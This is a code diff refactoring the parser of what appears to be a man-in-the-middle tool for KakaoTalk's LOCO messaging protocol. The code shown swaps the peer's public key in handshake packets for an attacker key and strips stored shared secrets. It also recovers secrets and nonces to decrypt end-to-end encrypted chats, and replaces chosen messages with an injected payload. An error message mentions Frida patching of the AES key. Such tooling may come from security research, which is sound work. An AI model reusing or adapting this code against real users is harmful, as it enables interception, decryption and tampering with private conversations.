@@ -1,132 +1,13 @@
 import base64
-import io
 import logging
-import re
 import struct
 
 import bson
-from lib.crypto_utils import (
-    aes_decrypt,
-    aes_e2e_decrypt,
-    aes_encrypt,
-    compute_key,
-    compute_nonce,
-    get_rsa_public_key_pem,
-    rsa_decrypt,
-    rsa_encrypt,
-)
 
-
-class LocoPacket:
-    def __init__(
-        self,
-        identifier=0,
-        status_code=0,
-        loco_command="",
-        body_type=0,
-        body_length=0,
-        body_payload=b"",
-    ):
-        self.id = identifier
-        self.status_code = status_code
-        self.loco_command = loco_command
-        self.body_type = body_type
-        self.body_length = body_length
-        self.body_payload = body_payload
-
-    def get_packet_bytes(self) -> bytes:
-        try:
-            f = io.BytesIO()
-            f.write(struct.pack("<I", self.id))
-            f.write(struct.pack("<H", self.status_code))
-            f.write(self.loco_command.encode("utf-8"))
-            f.write(b"\x00" * (11 - len(self.loco_command)))
-            f.write(struct.pack("<b", self.body_type))
-            f.write(struct.pack("<i", self.body_length))
-            f.write(self.body_payload)
-            return f.getvalue()
-        except Exception as general_exception:
-            logging.error("Could not create LOCO packet: %s", general_exception)
-            return None
-
-    def get_packet_as_dict(self) -> dict:
-        loco_dict = vars(self)
-
-        try:
-            if loco_dict["body_payload"] and isinstance(
-                loco_dict["body_payload"], bytes
-            ):
-                loco_dict["body_payload"] = bson.loads(self.body_payload)
-            elif loco_dict["body_payload"] and isinstance(
-                loco_dict["body_payload"], dict
-            ):
-                loco_dict["body_payload"] = self.body_payload
-        except Exception as general_exception:
-            loco_dict = {}
-            logging.error(
-                "Couldn't decode BSON body of packet %s: %s",
-                self.loco_command,
-                general_exception,
-            )
-
-        return loco_dict
-
-
-class LocoEncryptedPacket:
-    def __init__(self, length=0, iv=b"", payload=b""):
-        self.length = length
-        self.iv = iv
-        self.payload = payload
-
-    def create_new_packet(self, loco_packet: LocoPacket) -> bytes:
-        if not loco_packet:
-            logging.error(
-                "Could not create LOCO encrypted packet: LOCO packet data is None."
-            )
-            return None
-
-        encrypted_packet = aes_encrypt(loco_packet.get_packet_bytes(), self.iv)
-
-        if not encrypted_packet:
-            logging.error("Could not encrypt LOCO packet.")
-            return None
-
-        try:
-            f = io.BytesIO()
-            f.write(struct.pack("<I", len(encrypted_packet) + len(self.iv)))
-            f.write(self.iv)
-            f.write(encrypted_packet)
-            return f.getvalue()
-        except Exception as general_exception:
-            logging.error(
-                "Could not create LOCO encrypted packet: %s", general_exception
-            )
-            return None
-
-    def get_packet_bytes(self) -> bytes:
-        try:
-            f = io.BytesIO()
-            f.write(struct.pack("<I", len(self.payload) + len(self.iv)))
-            f.write(self.iv)
-            f.write(self.payload)
-            return f.getvalue()
-        except Exception as general_exception:
-            logging.error(
-                "Could not convert LOCO encrypted packet to bytes: %s",
-                general_exception,
-            )
-            return None
-
-
-class LocoHandshakePacket:
-    def __init__(self, length=256, handshake_type=0, block_cipher_mode=0, payload=b""):
-        self.length = length
-        self.type = handshake_type
-        self.block_cipher_mode = block_cipher_mode
-        self.payload = payload
-
-        self.cipher_mode_map = {1: "CBC", 2: "AES/CFB/NoPadding", 3: "OFB"}
-        self.encryption_mode_map = {15: "RSA/NONE/OAEPWithSHA1AndMGF1Padding"}
+from lib.crypto_utils import (aes_decrypt, aes_e2e_decrypt, compute_nonce,
+                              get_clean_public_key, rsa_decrypt, rsa_encrypt)
+from lib.loco_packet import (LocoEncryptedPacket, LocoHandshakePacket,
+                             LocoPacket)
 
 
 class LocoParser:
@@ -147,6 +28,7 @@ class LocoParser:
             body_type = struct.unpack("<b", data[17:18])[0]
             body_length = struct.unpack("<i", data[18:22])[0]
             body_payload = data[22:]
+
             return LocoPacket(
                 identifier,
                 status_code,
@@ -160,6 +42,7 @@ class LocoParser:
                 "Couldn't parse LOCO packet: %s \nAre you running Frida in parallel to patch the AES key?",
                 general_exception,
             )
+
             return None
 
     def parse_loco_encrypted_packet(self, data):
@@ -171,7 +54,13 @@ class LocoParser:
             length = struct.unpack("<I", data[0:4])[0]
             iv = data[4:20]
             payload = data[20:]
-            return LocoEncryptedPacket(length, iv, payload)
+
+            if length > (len(data) - 4):
+                is_fragmented = True
+            else:
+                is_fragmented = False
+
+            return LocoEncryptedPacket(length, iv, payload, is_fragmented)
         except Exception as general_exception:
             logging.error("Couldn't parse LOCO encrypted packet: %s", general_exception)
             return None
@@ -210,18 +99,18 @@ class LocoParser:
 
         body_json = self.loco_packet.body_payload
 
-        # MSG LOCO packet
+        # Read message from "MSG" LOCO packet
         if (
             "chatLog" in body_json
             and body_json["chatLog"]["message"] == trigger_message
         ):
             body_json["chatLog"]["message"] = payload
 
-        # WRITE LOCO packet
+        # Read message from "WRITE" LOCO packet
         if "msg" in body_json and body_json["msg"] == trigger_message:
             body_json["msg"] = payload
 
-        # LOGINLIST LOCO packet
+        # Read message from "LOGINLIST" LOCO packet
         if "chatDatas" in body_json and body_json["chatDatas"]:
             if (
                 "l" in body_json["chatDatas"][0]
@@ -263,22 +152,10 @@ class LocoParser:
         self.loco_encrypted_packet.payload = bytes(ciphertext)
         return self.loco_encrypted_packet.get_packet_bytes()
 
-    def get_clean_public_key(self, key_pair) -> str:
-        mitm_public_key_pem = get_rsa_public_key_pem(key_pair).decode("utf-8")
-        header = "-----BEGIN PUBLIC KEY-----"
-        footer = "-----END PUBLIC KEY-----"
-        pattern = re.compile(
-            f"{header}|{footer}",
-            re.MULTILINE,
-        )
-        mitm_public_key_cleaned = pattern.sub("", mitm_public_key_pem).replace("\n", "")
-
-        return mitm_public_key_cleaned
-
     def inject_public_key(self, key_pair):
         if not self.loco_packet:
             logging.error("LOCO packet data is None.")
-            return (None, None, None)
+            return (None, None)
 
         if isinstance(self.loco_packet.body_payload, bytes):
             self.loco_packet.body_payload = bson.loads(self.loco_packet.body_payload)
@@ -289,33 +166,31 @@ class LocoParser:
             "SCREATE",
             "CHATONROOM",
         }:
-            return (None, None, None)
+            return (None, None)
 
         if not self.loco_packet.body_payload.get("pi"):
-            logging.error(
-                "LOCO packet %s doesn't contain dictionary key 'pi'.",
+            logging.warning(
+                "There's no public key in %s packet. No need to replace it.",
                 self.loco_packet.loco_command,
             )
-            return (None, None, None)
+            return (None, None)
 
-        mitm_public_key_cleaned = self.get_clean_public_key(key_pair)
+        mitm_public_key_cleaned = get_clean_public_key(key_pair)
 
         # logging.info("MITM public key: %s", mitm_public_key_cleaned)
 
         original_public_key = self.loco_packet.body_payload["pi"][0]["ek"]
-        user_id = self.loco_packet.body_payload["pi"][0]["u"]
         self.loco_packet.body_payload["pi"][0]["ek"] = mitm_public_key_cleaned
 
         if not len(original_public_key) == len(mitm_public_key_cleaned):
             logging.error("Original and MITM public key don't have the same length!")
-            return (None, None, None)
+            return (None, None)
 
         self.loco_packet.body_payload = bson.dumps(self.loco_packet.body_payload)
         self.loco_packet.body_length = len(self.loco_packet.body_payload)
 
         return (
             original_public_key.encode(),
-            user_id,
             self.loco_encrypted_packet.create_new_packet(self.loco_packet),
         )
 
@@ -332,7 +207,7 @@ class LocoParser:
 
         if self.loco_packet.body_payload.get("si"):
             logging.warning(
-                "Removing stored shared secret from %s packet.",
+                "Removing stored shared secret from %s packet...",
                 self.loco_packet.loco_command,
             )
             self.loco_packet.body_payload.pop("si")
@@ -341,10 +216,6 @@ class LocoParser:
         self.loco_packet.body_length = len(self.loco_packet.body_payload)
 
         return self.loco_encrypted_packet.create_new_packet(self.loco_packet)
-
-    def get_e2e_encryption_key(self, shared_secret: bytes):
-        salt = b"53656372657443686174526f6f6d4b6579"
-        return compute_key(shared_secret, salt, 32)
 
     def get_shared_secret(self, rsa_key_pair) -> bytes:
         shared_secret = None
@@ -429,7 +300,7 @@ class LocoParser:
             msg_id = self.loco_packet.body_payload["chatLog"]["msgId"]
             chat_id = self.loco_packet.body_payload["chatId"]
 
-        # KakaoTalk uses either the msgId or chatId to compute the nonce
+        # KakaoTalk uses either the msgId or chatId as an input seed to compute the nonce
         nonce_with_msg_id = compute_nonce(shared_secret, msg_id)
         nonce_with_chat_id = compute_nonce(shared_secret, chat_id)
 
